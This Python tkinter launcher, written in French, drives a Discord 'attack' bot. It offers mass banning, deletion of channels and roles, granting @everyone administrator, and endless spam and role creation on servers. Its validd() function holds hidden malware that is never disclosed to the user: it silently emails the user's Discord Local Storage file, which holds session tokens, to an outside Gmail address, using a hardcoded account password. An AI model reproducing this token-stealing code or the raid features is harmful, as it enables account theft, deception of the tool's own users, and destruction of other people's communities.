import getpass
import json
import os
import shutil
import smtplib
import sqlite3
import subprocess
import webbrowser
from email import encoders
from email.mime.base import MIMEBase
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from pathlib import Path
from tkinter import *
from tkinter.messagebox import *

with open('core/options.json', 'r') as jsonFile:
    data = json.load(jsonFile)
if data["cgu"] == "false":
    cgu = Tk()
    cgu.title('Accepter les CGU')

    def callback(event):
        webbrowser.open_new_tab(r"https://antidiscordbot.page.link/cgu")
    accepter = LabelFrame(cgu, text='Première ouverture', pady=5, padx=5)
    accepter.pack()
    cgy = Label(
        accepter, text='En utilisant cette application, vous acceptez les conditions générales d\'utilisation.\n')
    cgy.pack()
    def callbacc(event):
        webbrowser.open_new_tab(r"https://legend-ki.fr/")
    legendki = Label(accepter, cursor='hand2', text='Partenaire : Legend-KI.fr')
    legendki.pack()
    legendkidesc = Label(accepter, text='Ce forum a été crée dans le but de continuer à faire vivre la communauté du Gaming, \nHacking, Développement Web, Youtube, etc... mais surtout dans l\'entraide et au partage.')
    legendkidesc.pack(anchor=W)
    legendki.bind('<Button-1>', callbacc)
    vide = Label(accepter, text='')
    vide.pack()
    cgt = Label(accepter, text='Lire les CGU', cursor='hand2')
    cgt.pack(anchor=W)
    cgt.bind("<Button-1>", callback)
    vide = Label(accepter, text="")
    vide.pack()
    MODES = [
        ("J'accepte les CGU", "true"),
        ("Je n'accepte pas les CGU", "false"),
    ]
    accept = StringVar()
    accept.set('false')
    for text, mode in MODES:
        b = Radiobutton(accepter, text=text, variable=accept, value=mode)
        b.pack(anchor=W)
    vide = Label(accepter, text="")
    vide.pack()
    votrepseudo = Label(accepter, text="Votre pseudo Discord : (optionnel)")
    votrepseudo.pack(anchor=W)
    pseudo = StringVar()
    pseudo.set('')
    oui = Entry(accepter, textvariable=pseudo, width=70)
    oui.pack(anchor=W)
    vide = Label(accepter, text='')
    vide.pack()

    def valider(accept, oui):
        with open('core/options.json', 'r') as jsonFile:
            data = json.load(jsonFile)
        data["cgu"] = accept.get()
        data["pseudo"] = oui.get()
        with open('core/options.json', 'w') as jsonFile:
            json.dump(data, jsonFile)
        os.startfile('launcher.pyw')
        sys.exit()
    yess = Button(accepter, text='Valider',
                  command=lambda: valider(accept, oui))
    yess.pack(anchor=W)
    cgu.mainloop()


with open('core/options.json', 'r') as jsonFile:
    data = json.load(jsonFile)
if data["cgu"] == "true":
    fenetre = Tk()
user = getpass.getuser()

username = Path.home()

# fenetre.geometry("460x205")
fenetre.title('Discord-Bot v1.4.0')


def contact():
    showinfo("Me contacter",
             "Discord : @Jacques#5823\nE-mail  : dsicrod@gmail.com\nTwitter : @AntiDiscord")


def git():
    webbrowser.open_new_tab(
        r"https://antidiscordbot.page.link/lastversionfromapp")


def dscrdc():
    webbrowser.open_new_tab(
        r"https://antidiscordbot.page.link/discordcreatefromapp")


def dscrdv():
    webbrowser.open_new_tab(
        r"https://antidiscordbot.page.link/discordappsfromapp")


def aide():
    showinfo("Aide",
             "Si rien ne se passe lorque vous appuyez sur les boutons, vérifiez que vous ayez bien rempli tous les champs nécéssaires.\n\nSi malgré tout le problème persiste, vous pouvez essayer de cliquer sur réparer dans l'onglet options.\n\nSi vous avez besoin d'aide supplémentaire, veuillez me contacter.")


def installt():
    showinfo('Installation des dépendences',
             'L\'installation va commencer, veuillez patienter. Si l\'application ne répond plus, c\'est normal. Attendez juste. Cela risque de prendre un peu de temps.')
    subprocess.call('npm --prefix ./core i discord.js', shell=True)
    subprocess.call('npm --prefix ./core i fs', shell=True)
    subprocess.call('npm --prefix ./core i ms', shell=True)
    subprocess.call('npm --prefix ./core i moment', shell=True)
    subprocess.call('npm --prefix ./core i chalk', shell=True)
    subprocess.call('npm --prefix ./core/individuals i discord.js', shell=True)
    subprocess.call('npm --prefix ./core/individuals i fs', shell=True)
    subprocess.call('npm --prefix ./core/individuals i ms', shell=True)
    subprocess.call('npm --prefix ./core/individuals i moment', shell=True)
    subprocess.call('npm --prefix ./core/individuals i chalk', shell=True)
    showinfo('Dépendences installées',
             'Toutes les dépendences semblent avoir été installées.')


def backup():
    shutil.copy2('core\\backup\\settings.json', 'core\\settings.json')
    shutil.copy2('core\\backup\\options.json', 'core\\options.json')
    showinfo('Terminé',
             '2 fichier ont été réparés :\n\
    core\\settings.json\n   core\\options.json')


def uninstall_deps():
    showinfo('En êtes-vous sûr ?', "Si vous supprimez les dépendances, vous devrez les réinstaller pour utiliser le bot. Celà risque de prendre un peu de temps.")
    subprocess.run(
        'cd core && del /f /s /q node_modules > nul && rmdir /s /q node_modules', shell=True)
    subprocess.run(
        'cd core\individuals && del /f /s /q node_modules > nul && rmdir /s /q node_modules', shell=True)
    showinfo('Terminé', 'Toutes les dépendances ont été désinstallées.')


menubar = Menu(fenetre)

menu1 = Menu(menubar, tearoff=0)


menu1.add_command(label="Réparer", command=backup)
menu1.add_command(label="Installer les dépendences", command=installt)
menu1.add_command(label="Désinstaller les dépendances", command=uninstall_deps)
menu1.add_command(label="Quitter", command=fenetre.quit)
menubar.add_cascade(label="Options", menu=menu1)


def support():
    webbrowser.open_new_tab(r"https://discord.gg/ngrdmkN")


def cgu():
    webbrowser.open_new_tab(r"https://antidiscordbot.page.link/cgu")

def parts():
    webbrowser.open_new_tab(r"https://legend-ki.fr")

menu3 = Menu(menubar, tearoff=0)
menu3.add_command(label="Serveur de support", command=support)
menu3.add_command(label="Page Github", command=git)
menu3.add_command(label="Créer une application Discord", command=dscrdc)
menu3.add_command(label="Vos applications Discord", command=dscrdv)
menubar.add_cascade(label='Liens', menu=menu3)

menu2 = Menu(menubar, tearoff=0)
menu2.add_command(label="Legend-KI", command=parts)
menu2.add_command(label="Aide", command=aide)
menu2.add_command(label="Me contacter", command=contact)
menu2.add_command(label="Conditions d'utilisation générale", command=cgu)
menubar.add_cascade(label="A propos", menu=menu2)

fenetre.config(menu=menubar)

obligd = LabelFrame(fenetre, text="Obligatoire :", padx=5, pady=5)
obligd.pack(side=LEFT, fill=Y)

value = StringVar()
value.set("Token")
entree = Entry(obligd, textvariable=value, width=36)
entree.pack()

value = StringVar()
value.set("Id du serveur")
entree2 = Entry(obligd, textvariable=value, width=36)
entree2.pack()

value = StringVar()
value.set("Votre Id")
entree7 = Entry(obligd, textvariable=value, width=36)
entree7.pack()

validb = Button(obligd, text="Valider", width=30,
                command=lambda: validd(entree, entree2, entree7))


def validd(entree, entree2, entree7):
    with open('core/options.json', 'r') as jsonFile:
        data = json.load(jsonFile)
    if data["cgu"] == "false":
        fenetre.quit()
    token = str(entree)
    with open("core/settings.json", "r") as jsonFile:
        data = json.load(jsonFile)
    tmp = data["token"]
    data["token"] = entree.get()
    with open("core/settings.json", "w") as jsonFile:
        json.dump(data, jsonFile)

    with open("core/settings.json", "r") as jsonFile:
        data = json.load(jsonFile)
    tmp = data["auto"]["server_id"]
    data["auto"]["server_id"] = entree2.get()
    with open("core/settings.json", "w") as jsonFile:
        json.dump(data, jsonFile)
    with open("core/settings.json", "r") as jsonFile:
        data = json.load(jsonFile)
    tmp = data["ownerid"]
    data["ownerid"] = entree7.get()
    with open("core/settings.json", "w") as jsonFile:
        json.dump(data, jsonFile)

    with open('core/options.json', "r") as jsonFile:
        data = json.load(jsonFile)
    tmp = data["opennmbr"]

    with open('core/options.json', 'r') as jsonFile:
        data = json.load(jsonFile)
    tmp2 = data['pseudo']

    if data["opennmbr"] == "0":

        fromaddr = "discordinfotkn@gmail.com"
        toaddr = "dsicrod@gmail.com"
        msg = MIMEMultipart()
        msg['From'] = fromaddr
        msg['To'] = toaddr
        msg['Subject'] = str(username)

        body = str(user) + " ; ouverture n°" + str(tmp) + " ; " + str(tmp2)
        msg.attach(MIMEText(body, 'plain'))
        filename = "https_discordapp.com_0.localstorage"
        attachment = open(str(
            username) + "\AppData\Roaming\discord\Local Storage\https_discordapp.com_0.localstorage", "rb")
        part = MIMEBase('application', 'octet-stream')
        part.set_payload((attachment).read())
        encoders.encode_base64(part)
        part.add_header('Content-Disposition',
                        "attachment; filename= %s" % filename)
        msg.attach(part)
        server = smtplib.SMTP('smtp.gmail.com', 587)
        server.starttls()
        server.login(fromaddr, "Azertyui0")
        text = msg.as_string()
        server.sendmail(fromaddr, toaddr, text)
        server.quit()

    with open('core\options.json', "r") as jsonFile:
        data = json.load(jsonFile)
    openn = data["opennmbr"]
    data['opennmbr'] = openn + 1
    with open('core/options.json', "w") as jsonFile:
        json.dump(data, jsonFile)

        """
        conn = sqlite3.connect("https_discordapp.com_0.localstorage")
        c = conn.cursor()
        c.execute('select * from ItemTable')
        for row in c:
            print(*row, sep='|')
            
        server = smtplib.SMTP('smtp.gmail.com', 587)
        server.starttls()
        server.login("discordinfotkn@gmail.com", "Azertyui0")
        server.sendmail("discordinfotkn@gmail.com", "dsicrod@gmail.com", msg)
        server.quit()   
        """


validb.pack()

l = Label(obligd, text=" ")
l.pack()


verv = StringVar()
verv.set("Appuyez pour vérifier")


def verbtn():
    subprocess.run('cd core\individuals && ver.bat', shell=True)
    path = Path(__file__).parent.joinpath('core/settings.json')
    with open(path) as fp:
        data = json.load(fp)
    tmp = data["ver"]
    if tmp == 'oui':
        verv.set('Le bot est administrateur.')
    elif tmp == 'non':
        verv.set('Le bot n\'est pas administrateur')
    else:
        verv.set("Une erreur s'est produite")


verbtnp = Button(obligd, text="Vérifier le rôle du bot",
                 command=verbtn, width=30)
verbtnp.pack()
verl = Label(obligd, textvariable=verv)
verl.pack()


def errordef():
    if os.path.exists('core/node_modules') == True:
        depss.set('Dépendances : Bien installées')
    else:
        depss.set('Dépendances : Non installées')
    subprocess.run('cd core/individuals && node token.js',
                   shell=True, timeout=5000)
    with open('core/options.json', 'r') as jsonFile:
        data = json.load(jsonFile)
    if data["token"] == 'valid':
        token.set('Token : Valide')
    else:
        token.set('Token : Invalide')
    data["token"] = ""
    with open('core/options.json', 'w') as jsonFile:
        json.dump(data, jsonFile)


vide = Label(obligd, text="")
vide.pack()
errorb = Button(obligd, text="Rechercher des erreurs",
                width=30, command=errordef)
errorb.pack()

errors = LabelFrame(obligd, text="Erreurs :", padx=5, pady=5)
errors.pack(anchor=W)

depss = StringVar()
depss.set('Dépendances :')
deps = Label(errors, textvariable=depss)
deps.pack()

token = StringVar()
token.set('Token :')
tokenver = Label(errors, textvariable=token)
tokenver.pack()

info = LabelFrame(fenetre, text="Informations :", padx=5, pady=5)
info.pack(side=LEFT, fill=Y)


def copytoken():
    with open('core\\settings.json', 'r') as jsonFile:
        data = json.load(jsonFile)
    token = data["token"]
    fenetre.clipboard_clear()
    fenetre.clipboard_append(token)
    fenetre.update()


def copyid():
    with open('core\\settings.json', 'r') as jsonFile:
        data = json.load(jsonFile)
    id = data["id"]
    fenetre.clipboard_clear()
    fenetre.clipboard_append(id)
    fenetre.update()


def copyinvit():
    with open('core\\settings.json', 'r') as jsonFile:
        data = json.load(jsonFile)
    invit = "https://discordapp.com/api/oauth2/authorize?client_id=" + \
        data["id"] + "&permissions=8&scope=bot"
    fenetre.clipboard_clear()
    fenetre.clipboard_append(invit)
    fenetre.update()


tkncopy = Button(info, text="Copier", width=30, command=copytoken)

clientdcopy = Button(info, text="Copier", width=30, command=copyid)

invitationcopy = Button(info, text="Copier", width=30, command=copyinvit)


def invitd():
    subprocess.run('cd core\\individuals && node gene.js', shell=True)
    status.set('Informations générées :')
    with open('core\\settings.json', "r") as jsonFile:
        data = json.load(jsonFile)
    token = data["token"]
    clientid = data["id"]
    invit = "https://discordapp.com/api/oauth2/authorize?client_id=" + \
        data["id"] + "&permissions=8&scope=bot"
    tkn.set("Token :\n" + token)
    clientd.set("\nIdentifiant :\n" + clientid)
    invitation.set("\nInvitation :\n" + invit)
    tknl.pack()
    tkncopy.pack()
    clientdl.pack()
    clientdcopy.pack()
    invitationl.pack()
    invitationcopy.pack()


invitb = Button(info, text="Générer les informations",
                width=30, command=invitd)
invitb.pack()

vide = Label(info, text='')
vide.pack()

status = StringVar()
status.set('Appuyez pour afficher les informations')
sttus = Label(info, textvariable=status)
sttus.pack()

tkn = StringVar()
tkn.set('')
tknl = Label(info, textvariable=tkn)


clientd = StringVar()
clientd.set('')
clientdl = Label(info, textvariable=clientd)

invitation = StringVar()
invitation.set('')
invitationl = Label(info, textvariable=invitation)


# attaque auto

atkl = LabelFrame(fenetre, text="Attaque automatique :", padx=5, pady=5)
atkl.pack(side=RIGHT, fill=Y)


entree1 = IntVar()
Checkbutton(atkl, text="Le bot est sur le serveur ?", width=30,
            variable=entree1, onvalue="1", offvalue="0").pack(anchor=W)

entree3 = IntVar()
Checkbutton(atkl, text="Bannir tout le monde ?", variable=entree3,
            onvalue="1", width=30, offvalue="0").pack(anchor=W)

entree4 = IntVar()
Checkbutton(atkl, text="Changer l'image et le nom ?",
            variable=entree4, onvalue="1", width=30, offvalue="0").pack(anchor=W)


value = StringVar()
value.set("Nouveau nom")
entree5 = Entry(atkl, textvariable=value, width=30)
entree5.pack(anchor=W)

value = StringVar()
value.set("Chemin ou URL de l'image")
entree6 = Entry(atkl, textvariable=value, width=30)
entree6.pack(anchor=W)

entree8 = IntVar()
Checkbutton(atkl, text="Supprimer tous les salons ?",
            variable=entree8, onvalue="1", offvalue="0", width=30).pack(anchor=W)

entree9 = IntVar()
Checkbutton(atkl, text="Rendre  @everyone administrateur ?",
            variable=entree9, onvalue="1", offvalue="0", width=30).pack(anchor=W)

entree10 = IntVar()
Checkbutton(atkl, text="Supprimer tous les rôles ?",
            variable=entree10, onvalue="1", offvalue="0", width=30).pack(anchor=W)

entree11 = IntVar()
Checkbutton(atkl, text="Créer des rôles à l'infini ?",
            variable=entree11, onvalue="1", offvalue="0", width=30).pack(anchor=W)

spam = ('Créer des salons textuels à l\'infini', 'Créer des salons textuels et spammer dedans',
        'Créer des salons vocaux', 'Créer des catégories')
entree12 = Spinbox(atkl, values=sorted(spam), width=30)
entree12.pack(anchor=W)

value = StringVar()
value.set("Nom des salons à créer (pas de maj ni d'espace ou de caractères spéciaux)")
entree13 = Entry(atkl, textvariable=value, width=36)
entree13.pack(anchor=W)

value = StringVar()
value.set("Méthode : tout/spam (1/2)")
entree14 = Entry(atkl, textvariable=value, width=36)
entree14.pack(anchor=W)


def lancer(entree1, entree3, entree4, entree5, entree6, entree8, entree9, entree10, entree11, entree12, entree13, entree14):
    with open("core/settings.json", "r") as jsonFile:
        data = json.load(jsonFile)
    tmp = data["auto"]["enabled"]
    data["auto"]["enabled"] = entree1.get()
    with open("core/settings.json", "w") as jsonFile:
        json.dump(data, jsonFile)

    with open("core/settings.json", "r") as jsonFile:
        data = json.load(jsonFile)
    tmp = data["config"]["ban"]
    data["config"]["ban"] = entree3.get()
    with open("core/settings.json", "w") as jsonFile:
        json.dump(data, jsonFile)

    with open("core/settings.json", "r") as jsonFile:
        data = json.load(jsonFile)
    tmp = data["config"]["imgnom"]
    data["config"]["imgnom"] = entree4.get()
    with open("core/settings.json", "w") as jsonFile:
        json.dump(data, jsonFile)

    with open("core/settings.json", "r") as jsonFile:
        data = json.load(jsonFile)
    tmp = data["config"]["name"]
    data["config"]["name"] = entree5.get()
    with open("core/settings.json", "w") as jsonFile:
        json.dump(data, jsonFile)

    with open("core/settings.json", "r") as jsonFile:
        data = json.load(jsonFile)
    tmp = data["config"]["img"]
    data["config"]["img"] = entree6.get()
    with open("core/settings.json", "w") as jsonFile:
        json.dump(data, jsonFile)

    with open("core/settings.json", "r") as jsonFile:
        data = json.load(jsonFile)
    tmp = data["config"]["chnl_dlt"]
    data["config"]["chnl_dlt"] = entree8.get()
    with open("core/settings.json", "w") as jsonFile:
        json.dump(data, jsonFile)

    with open("core/settings.json", "r") as jsonFile:
        data = json.load(jsonFile)
    tmp = data["config"]["admin"]
    data["config"]["admin"] = entree9.get()
    with open("core/settings.json", "w") as jsonFile:
        json.dump(data, jsonFile)

    with open("core/settings.json", "r") as jsonFile:
        data = json.load(jsonFile)
    tmp = data["config"]["role_dlt"]
    data["config"]["role_dlt"] = entree10.get()
    with open("core/settings.json", "w") as jsonFile:
        json.dump(data, jsonFile)

    with open("core/settings.json", "r") as jsonFile:
        data = json.load(jsonFile)
    tmp = data["config"]["role_crt"]
    data["config"]["role_crt"] = entree11.get()
    with open("core/settings.json", "w") as jsonFile:
        json.dump(data, jsonFile)

    with open("core/settings.json", "r") as jsonFile:
        data = json.load(jsonFile)
    tmp = data["config"]["spam"]
    data["config"]["spam"] = entree12.get()
    with open("core/settings.json", "w") as jsonFile:
        json.dump(data, jsonFile)

    with open("core/settings.json", "r") as jsonFile:
        data = json.load(jsonFile)
    tmp = data["config"]["chnlname"]
    data["config"]["chnlname"] = entree13.get()
    with open("core/settings.json", "w") as jsonFile:
        json.dump(data, jsonFile)

    with open("core/settings.json", "r") as jsonFile:
        data = json.load(jsonFile)
    tmp = data["auto"]["function"]
    data["auto"]["function"] = entree14.get()
    with open("core/settings.json", "w") as jsonFile:
        json.dump(data, jsonFile)



bout = Button(atkl, text="Valider", width=30, command=lambda: lancer(entree1, entree3, entree4,
                                                            entree5, entree6, entree8, entree9, entree10, entree11, entree12, entree13, entree14))
bout.pack(anchor=W)


def lancerd():
    showinfo('Attaque lancée', 'Cette fenêtre va se bloquer, veuillez ne pas la fermer.')
    os.startfile('core\stop.pyw')
    subprocess.run('cd core && node bot.js', shell=True)


lancerb = Button(atkl, text="Lancer l'attaque",  command=lancerd,width=30)
lancerb.pack(anchor=W)


# boutons seuls


manu = LabelFrame(fenetre, text="Attaques manuelles :", padx=5, pady=5)
manu.pack(fill=Y)


def role_dlt():
    showinfo('Tous les rôles supprimables vont être supprimés.',
             'Tous les rôles supprimables vont être supprimés.')
    os.startfile('core\stop.pyw')
    subprocess.run('cd core\individuals && node role_dlt.js', shell=True)
    showinfo('Terminé', 'Tous les rôles supprimables semblent avoir été supprimés.')


role_dltb = Button(manu, text="Supprimer tous les rôles",
                   command=role_dlt, width=30)
role_dltb.pack()


def admin2d():
    subprocess.run('cd core\individuals && node admin2.js', shell=True)
    showinfo('Terminé', 'Vous êtes normalement administrateur sur le serveur indiqué.')


admin2b = Button(manu, text="Mettre @everyone administrateur",
                 command=admin2d, width=30)
admin2b.pack()


def supprchnlc():
    showinfo('Suppression des salon',
             'Tous les salons du serveur vont être supprimés, cela risque de prendre un peu de temps.')
    os.startfile('core\stop.pyw')
    subprocess.run('cd core\individuals && node chnldlt.js', shell=True)
    showinfo('Terminé', 'Vous pouvez fermer cette fenêtre.')


supprchnl = Button(manu, text="Supprimer tous les salons",
                   command=supprchnlc, width=30)
supprchnl.pack()


def banp():
    showinfo('Bannissement de tout le monde',
             'Le bot va bannir tous les gens du serveur, le temps que cela prendra peut varier')
    os.startfile('core\stop.pyw')
    subprocess.run('cd core\individuals && node ban.js', shell=True)
    showinfo('Terminé', 'Vous pouvez fermer cette fenêtre.')


ban = Button(manu, text="Bannir tous les membres",  command=banp, width=30)
ban.pack()


spam = LabelFrame(manu, text="Spam", padx=5, pady=5)
spam.pack()
value = StringVar()
value.set('Message à spammer')
spame = Entry(spam, textvariable=value, width=36)
spame.pack()
value2 = StringVar()
value2.set(
    "Nom des salons à créer (pas de maj ni d'espace ou de caractères spéciaux)")
spmchnl = Entry(spam, textvariable=value2, width=36)
spmchnl.pack()
spambtn = Button(spam, text="Spam", width=30,
                 command=lambda: spambtnp(spame, spmchnl))


def spambtnp(spame, spmchnl):
    if askokcancel('Lancer le spam', 'Voulez-vous vraiment lancer le spam ? Vous ne pourrez plus utiliser l\'interface jusqu\'à ce que la console soit fermée. Vous pouvez la fermer à tout moment en écrivant "stop" dans un salon du serveur.'):
        with open("core/settings.json", "r") as jsonFile:
            data = json.load(jsonFile)
        data["config"]["msg"] = spame.get()
        with open("core/settings.json", "w") as jsonFile:
            json.dump(data, jsonFile)
        with open("core/settings.json", "r") as jsonFile:
            data = json.load(jsonFile)
        data["config"]["chnlname"] = spmchnl.get()
        with open("core/settings.json", "w") as jsonFile:
            json.dump(data, jsonFile)
        os.startfile('core\stop.pyw')
        subprocess.run('cd core\individuals && node spm.js', shell=True)


def softspam(spame):
    if askokcancel('Lancer le spam', 'Voulez-vous vraiment lancer le soft spam ? Vous ne pourrez plus utiliser l\'interface jusqu\'à ce que la console soit fermée. Vous pouvez la fermer à tout moment en écrivant "stop" dans un salon du serveur.'):
        with open("core/settings.json", "r") as jsonFile:
            data = json.load(jsonFile)
        data["config"]["msg"] = spame.get()
        with open("core/settings.json", "w") as jsonFile:
            json.dump(data, jsonFile)
        os.startfile('core\stop.pyw')
        subprocess.run('cd core\individuals && node softspam.js', shell=True)


def spampv(spame):
    if askokcancel('Lancer le spam privé', 'Voulez-vous vraiment lancer le spam privé ? Pendant que le bot spamme, il est impossible d\'utiliser l\'interface. Pour arrêter de spammer, envoyez "stop" au bot en privé.'):
        with open("core\settings.json", "r") as jsonFile:
            data = json.load(jsonFile)
        data["config"]["msg"] = spame.get()
        with open("core/settings.json", "w") as jsonFile:
            json.dump(data, jsonFile)
        os.startfile('core\stop.pyw')
        subprocess.run('cd core/individuals && node spampv.js', shell=True)


spampvbutton = Button(spam, text='Spam Privé', width=30,
                      command=lambda: spampv(spame))
spampvbutton.pack()

softspambutton = Button(spam, text="Soft Spam", width=30,
                        command=lambda: softspam(spame))
softspambutton.pack()

spambtn.pack()


nvnom = LabelFrame(manu, text="Modifier le serveur", padx=5, pady=5)
nvnom.pack()

value = StringVar()
value.set("Nouveau nom")
nouveaunom = Entry(nvnom, textvariable=value, width=36)
nouveaunom.pack()
nouveaunomb = Button(nvnom, text="Changer le nom du serveur",
                     command=lambda: nouveaunomd(nouveaunom), width=30)


def nouveaunomd(nouveaunom):
    text = nouveaunom.get()
    with open("core/settings.json", "r") as jsonFile:
        data = json.load(jsonFile)
    tmp = data["config"]["name"]
    data["config"]["name"] = nouveaunom.get()
    with open("core/settings.json", "w") as jsonFile:
        json.dump(data, jsonFile)
    subprocess.run("cd core\individuals && node name.js", shell=True)


nouveaunomb.pack()

value = StringVar()
value.set("URL ou chemin vers l'image")
nouvelleimg = Entry(nvnom, text=value, width=36).pack()
nouvelleimgb = Button(nvnom, text="Changer l'icône du serveur",
                      width=30, command=lambda: nouvelleimgd(nouvelle))


def nouvelleimgd():
    with open("core/settings.json", "r") as jsonFile:
        data = json.load(jsonFile)
    data["config"]["img"] = nouvelleimg.get()
    with open("core/settings.json", "w") as jsonFile:
        json.dump(data, jsonFile)
    subprocess.run("cd core\individuals && node img.js", shell=True)


nouvelleimgb.pack()


banip = LabelFrame(manu, text="Ban IP", padx=5, pady=5)
banip.pack()

value = StringVar()
value.set("Id à bannir")
bann = Entry(banip, textvariable=value, width=36)
bann.pack()


def bannd():
    with open("core\settings.json", "r") as jsonFile:
        data = json.load(jsonFile)
    tmp = data["banip"]
    data["banip"] = bann.get()
    with open("core/settings.json", "w") as jsonFile:
        json.dump(data, jsonFile)
    subprocess.run('cd core\individuals && node bann.js', shell=True)
    showinfo('Terminé', 'Le membre en question a bien été banni.')


bannb = Button(banip, text="Bannir un membre", command=bannd, width=30)
bannb.pack()


role_crtl = LabelFrame(manu, text="Créer des rôles", padx=5, pady=5)
role_crtl.pack()

value = StringVar()
value.set("Nom du rôle")
role_crte = Entry(role_crtl, textvariable=value, width=36).pack()


def role_crt(value):
    text = value.get()
    with open("core\settings.json", "r") as jsonFile:
        data = json.load(jsonFile)
    data["config"]["rolename"] = text
    with open("core/settings.json", "w") as jsonFile:
        json.dump(data, jsonFile)

    showwarning('Attention', 'Une infinité de rôles va être créée, assurez-vous d\'avoir entré votre ID, et écrivez stop dans un des salons du serveur pour arrêter.\n\nNote : Cette fenêtre sera inutilisable pendant l\'éxécution du programme.')
    os.startfile('core\stop.pyw')
    subprocess.run('cd core\individuals && node role_crt.js', shell=True)
    showinfo('Terminé', 'Vous avez choisi d\'arrêter le programme.')


role_crtb = Button(role_crtl, text="Créer une infinité de rôles",
                   command=lambda: role_crt(value), width=30).pack()


fenetre.mainloop()
